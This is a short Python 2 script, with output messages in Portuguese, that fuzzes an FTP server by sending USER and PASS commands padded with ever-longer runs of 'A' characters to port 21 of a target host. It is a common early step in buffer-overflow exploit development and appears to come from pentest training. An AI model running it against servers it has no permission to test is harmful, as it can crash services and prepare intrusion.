#!/usr/bin/python

import socket
import sys
import time

buffer=["A"]
contador=1000
while len(buffer) <= 50:
    buffer.append("A"*contador)
    contador=contador+200

for string in buffer:
    print "fuzzing FTP USER com %s bytes " %len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],21))
    time.sleep(2)

    s.send("USER "+string+"\r\n")
    s.send("PASS "+string+"\r\n")
